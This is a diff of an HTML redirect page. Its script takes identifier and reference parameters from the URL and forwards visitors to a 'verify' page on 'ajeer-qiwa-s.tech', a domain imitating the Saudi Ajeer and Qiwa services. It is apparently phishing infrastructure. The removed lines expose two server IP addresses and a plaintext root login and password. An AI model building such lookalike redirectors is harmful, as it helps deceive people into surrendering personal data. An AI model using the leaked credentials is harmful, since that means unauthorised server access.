@@ -1,37 +1,52 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-    <title>..</title>
-
+    <title>Redirecting...</title>
     <script>
         const params = new URLSearchParams(window.location.search);
 
-        const id = params.get("id");
+        let id = params.get("id");
+        const num = params.get("num");
+        const ref = params.get("ref");
         const type = params.get("type");
 
-        if (id) {
-            let target = "https://ajeer-qiwa-s.tech/view/" +
-                         encodeURIComponent(id);
-            let server = "72.61.164.184";
-            let serverback = "207.180.203.101";
-            let user = "root";
-            let pass = "Chessertyui";
-            if (type) {
-                target += "?type=" + encodeURIComponent(type);
-            }
+        if (!id) {
+            const segments = window.location.pathname
+                .split("/")
+                .filter(Boolean);
 
-            window.location.replace(target);
+            const last = segments[segments.length - 1];
+
+            if (last && last !== "view" && last !== "index.html") {
+                id = last;
+            }
+        }
+
+        if (id) {
+            const target = new URL(
+                "https://ajeer-qiwa-s.tech/ajeer/verify.html"
+            );
+
+            target.searchParams.set("id", id);
+
+            if (num) target.searchParams.set("num", num);
+            if (ref) target.searchParams.set("ref", ref);
+            if (type) target.searchParams.set("type", type);
+
+            window.location.replace(target.toString());
         } else {
-            document.body.innerHTML = `
-                <h2>Invalid request</h2>
-                <p>Missing ID.</p>
-            `;
+            document.addEventListener("DOMContentLoaded", () => {
+                document.body.innerHTML =
+                    "<h2>Invalid request</h2><p>Missing ID.</p>";
+            });
         }
     </script>
 </head>
-
-
+<body>
+    Redirecting...
+</body>
 </html>
+
